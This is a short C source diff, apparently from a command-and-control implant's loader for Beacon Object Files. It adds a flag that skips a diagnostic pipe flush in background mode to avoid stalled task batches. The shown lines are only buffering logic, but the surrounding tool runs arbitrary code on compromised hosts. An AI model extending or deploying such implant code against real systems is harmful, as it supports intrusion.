@@ -100,6 +100,7 @@ static char * dp_lenstr_be(DATAP * d, int * outlen) {
 /* ---------------- output buffering ---------------- */
 static char * g_out = NULL;
 static HANDLE g_ctrl = INVALID_HANDLE_VALUE;
+static int g_runOnce = 1;
 static int    g_outLen = 0, g_outCap = 0;
 
 static void out_reserve(int more) {
@@ -484,8 +485,12 @@ static int run_bof(char * wire, int wireLen) {
 		typedef void (*ENTRYFN)(char *, int);
 		ENTRYFN fn;
 		/* C-23: flush the diag BEFORE exec - if the BOF crashes we still
-		 * get the parse state out through the control pipe. */
-		if (g_outLen > 0 && g_ctrl != INVALID_HANDLE_VALUE) {
+		 * get the parse state out through the control pipe. BG mode skips
+		 * this: its FlushFileBuffers barrier blocks the DLL until the
+		 * beacon's psh_poll runs, which stalls the whole task batch and
+		 * pushed the output-pipe register past the DLL's 15s client-wait
+		 * window (live 11:59 jam). BG diag rides the normal output flush. */
+		if (g_runOnce && g_outLen > 0 && g_ctrl != INVALID_HANDLE_VALUE) {
 			flush_output_ctrl(g_ctrl);
 			g_outLen = 0;
 		}
@@ -590,6 +595,7 @@ static void run_async(LPVOID raw) {
 	d.b = (char *)gUserArgs;
 	d.n = blobLen > 0 ? blobLen : 0x11000;
 	runOnce = dp_int(&d);
+	g_runOnce = runOnce;
 	dp_int(&d); /* allocType (unused) */
 	dp_int(&d); /* syscallMethod (unused) */
 	dp_lenstr(&d, &tl); /* threadStart (unused) */
